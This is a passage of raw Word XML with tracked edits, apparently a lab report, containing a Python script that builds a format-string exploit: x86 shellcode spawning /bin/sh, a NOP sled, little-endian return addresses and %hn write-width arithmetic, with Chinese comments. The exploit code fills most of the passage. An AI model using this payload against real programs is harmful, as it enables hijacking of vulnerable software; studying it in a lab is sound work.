                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="008000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>usr/bin/python3</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="17816D82" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
                            <w:pPr>
                              <w:widowControl/>
                              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                              <w:spacing w:line="190" w:lineRule="atLeast"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="0000FF"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>import</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> sys</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5B52DBC8" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:widowControl/>
                              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                              <w:spacing w:line="190" w:lineRule="atLeast"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="14C6736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shellcode</w:t>
                            </w:r>
                            <w:proofErr w:type="gramStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>=(</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/>
                          </w:p>
                          <w:p w14:paraId="1C4617E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"\x31\xc0\x31\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>xdb</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>\xb0\xd5\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>xcd</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>\x80"</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="480FB87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"\x31\xc0\x50\x68//</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>sh</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>\x68/bin\x89\xe3\x50"</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1E243B8B"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"\x53\x89\xe1\x99\xb0\x0b\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>xcd</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>\x80\x00"</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="6F0D1192" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
                            <w:pPr>
                              <w:widowControl/>
                              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                              <w:spacing w:line="190" w:lineRule="atLeast"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                              </w:rPr>
                            </w:pPr>
                            <w:proofErr w:type="gramStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>).encode</w:t>
                            </w:r>
                            <w:proofErr w:type="gram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6367F237"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N=</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="098658"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>200</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="25C422A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往字符串中填满NOP</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7071AE5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content=</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:proofErr w:type="gramStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>bytearray</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90</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for</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i</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w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> range(N))</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="543930D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把shellcode放在尾部</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="31148D9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start= N-</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>len</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>(shellcode)</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7C88A4A1"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content[start</w:t>
                            </w:r>
                            <w:proofErr w:type="gramStart"/>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shellcode</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2120BF5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#把返回值的地址放在格式化字符串的头部</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0058E9B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addr1=</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ffff</w:t>
                            </w:r>
                            <w:ins w:id="189" w:author="zhao ruizhi" w:date="2023-05-08T16:39:00Z">
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:color w:val="098658"/>
                                  <w:kern w:val="0"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:lang w:bidi="ar"/>
                                </w:rPr>
                                <w:t>cfb8</w:t>
                              </w:r>
                            </w:ins>
                            <w:ins w:id="190" w:author="zhao ruizhi" w:date="2023-05-08T16:40:00Z">
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:color w:val="098658"/>
                                  <w:kern w:val="0"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:lang w:bidi="ar"/>
                                </w:rPr>
                                <w:t xml:space="preserve"> </w:t>
                              </w:r>
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:kern w:val="0"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:lang w:bidi="ar"/>
                                  <w:rPrChange w:id="191" w:author="zhao ruizhi" w:date="2023-05-08T16:44:00Z">
                                    <w:rPr>
                                      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                      <w:color w:val="098658"/>
                                      <w:kern w:val="0"/>
                                      <w:sz w:val="20"/>
                                      <w:szCs w:val="20"/>
                                      <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                      <w:lang w:bidi="ar"/>
                                    </w:rPr>
                                  </w:rPrChange>
                                </w:rPr>
                                <w:t>+ 4</w:t>
                              </w:r>
                            </w:ins>
                            <w:del w:id="192" w:author="zhao ruizhi" w:date="2023-05-08T16:39:00Z">
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:color w:val="098658"/>
                                  <w:kern w:val="0"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:lang w:bidi="ar"/>
                                </w:rPr>
                                <w:delText>d08c</w:delText>
                              </w:r>
                            </w:del>
                          </w:p>
                          <w:p w14:paraId="6E09B530"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addr2=</w:t>
                            </w:r>
                            <w:ins w:id="193" w:author="zhao ruizhi" w:date="2023-05-08T16:37:00Z">
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:color w:val="000000"/>
                                  <w:kern w:val="0"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:lang w:bidi="ar"/>
                                </w:rPr>
                                <w:t>addr1 + 2</w:t>
                              </w:r>
                            </w:ins>
                            <w:del w:id="194" w:author="zhao ruizhi" w:date="2023-05-08T16:37:00Z">
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:color w:val="0000FF"/>
                                  <w:kern w:val="0"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:lang w:bidi="ar"/>
                                </w:rPr>
                                <w:delText>0x</w:delText>
                              </w:r>
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:color w:val="098658"/>
                                  <w:kern w:val="0"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:lang w:bidi="ar"/>
                                </w:rPr>
                                <w:delText>ffffd08e</w:delText>
                              </w:r>
                            </w:del>
                          </w:p>
                          <w:p w14:paraId="0578F1B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0</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]=(addr1).</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>to_bytes</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,byteorder=</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>'little'</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>)</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0BDEDF4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8</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).encode(</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0027F3FF" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
                            <w:pPr>
                              <w:widowControl/>
                              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                              <w:spacing w:line="190" w:lineRule="atLeast"/>
                              <w:jc w:val="left"/>
                              <w:rPr>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8</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]=(addr2).</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>to_bytes</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,byteorder=</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>'little'</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>)</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="17C82B45" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
                            <w:pPr>
                              <w:widowControl/>
                              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                              <w:spacing w:line="190" w:lineRule="atLeast"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:ins w:id="195" w:author="zhao ruizhi" w:date="2023-05-08T16:50:00Z"/>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="008000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="008000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t># 加上%x和%</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="008000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>hn</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                          </w:p>
                          <w:p w14:paraId="7530C14B" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRPr="00193C1A" w:rsidRDefault="00000000">
                            <w:pPr>
                              <w:widowControl/>
                              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                              <w:spacing w:line="190" w:lineRule="atLeast"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:rPrChange w:id="196" w:author="zhao ruizhi" w:date="2023-05-08T16:50:00Z">
                                  <w:rPr>
                                    <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                    <w:color w:val="000000"/>
                                    <w:sz w:val="20"/>
                                    <w:szCs w:val="20"/>
                                  </w:rPr>
                                </w:rPrChange>
                              </w:rPr>
                            </w:pPr>
                            <w:proofErr w:type="spellStart"/>
                            <w:ins w:id="197" w:author="zhao ruizhi" w:date="2023-05-08T16:51:00Z">
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:color w:val="000000"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                </w:rPr>
                                <w:t>a</w:t>
                              </w:r>
                            </w:ins>
                            <w:ins w:id="198" w:author="zhao ruizhi" w:date="2023-05-08T16:50:00Z">
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:color w:val="000000"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                </w:rPr>
                                <w:t>ddr_little</w:t>
                              </w:r>
                              <w:proofErr w:type="spellEnd"/>
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:color w:val="000000"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                </w:rPr>
                                <w:t xml:space="preserve"> </w:t>
                              </w:r>
                            </w:ins>
                            <w:ins w:id="199" w:author="zhao ruizhi" w:date="2023-05-08T16:51:00Z">
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:color w:val="000000"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                </w:rPr>
                                <w:t xml:space="preserve">= </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cfd4</w:t>
                              </w:r>
                            </w:ins>
                            <w:ins w:id="200" w:author="zhao ruizhi" w:date="2023-05-08T16:53:00Z">
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:color w:val="098658"/>
                                  <w:kern w:val="0"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:lang w:bidi="ar"/>
                                </w:rPr>
                                <w:t xml:space="preserve"> </w:t>
                              </w:r>
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:kern w:val="0"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:lang w:bidi="ar"/>
                                  <w:rPrChange w:id="201" w:author="zhao ruizhi" w:date="2023-05-08T16:53:00Z">
                                    <w:rPr>
                                      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                      <w:color w:val="098658"/>
                                      <w:kern w:val="0"/>
                                      <w:sz w:val="20"/>
                                      <w:szCs w:val="20"/>
                                      <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                      <w:lang w:bidi="ar"/>
                                    </w:rPr>
                                  </w:rPrChange>
                                </w:rPr>
                                <w:t>+</w:t>
                              </w:r>
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:color w:val="098658"/>
                                  <w:kern w:val="0"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:lang w:bidi="ar"/>
                                </w:rPr>
                                <w:t xml:space="preserve"> 100</w:t>
                              </w:r>
                            </w:ins>
                          </w:p>
                          <w:p w14:paraId="6A74508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small =</w:t>
                            </w:r>
                            <w:ins w:id="202" w:author="zhao ruizhi" w:date="2023-05-08T16:51:00Z">
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:color w:val="000000"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                </w:rPr>
                                <w:t xml:space="preserve"> addr_little</w:t>
                              </w:r>
                            </w:ins>
                            <w:del w:id="203" w:author="zhao ruizhi" w:date="2023-05-08T16:51:00Z">
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:color w:val="0000FF"/>
                                  <w:kern w:val="0"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:lang w:bidi="ar"/>
                                </w:rPr>
                                <w:delText>0x</w:delText>
                              </w:r>
                            </w:del>
                            <w:del w:id="204" w:author="zhao ruizhi" w:date="2023-05-08T16:36:00Z">
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:color w:val="098658"/>
                                  <w:kern w:val="0"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:lang w:bidi="ar"/>
                                </w:rPr>
                                <w:delText>d134</w:delText>
                              </w:r>
                            </w:del>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15</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8</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0B42989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large=</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ffff</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>-</w:t>
                            </w:r>
                            <w:ins w:id="205" w:author="zhao ruizhi" w:date="2023-05-08T16:51:00Z">
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:color w:val="000000"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                </w:rPr>
                                <w:t>addr_little</w:t>
                              </w:r>
                            </w:ins>
                            <w:del w:id="206" w:author="zhao ruizhi" w:date="2023-05-08T16:51:00Z">
                              <w:r>
                                <w:rPr>
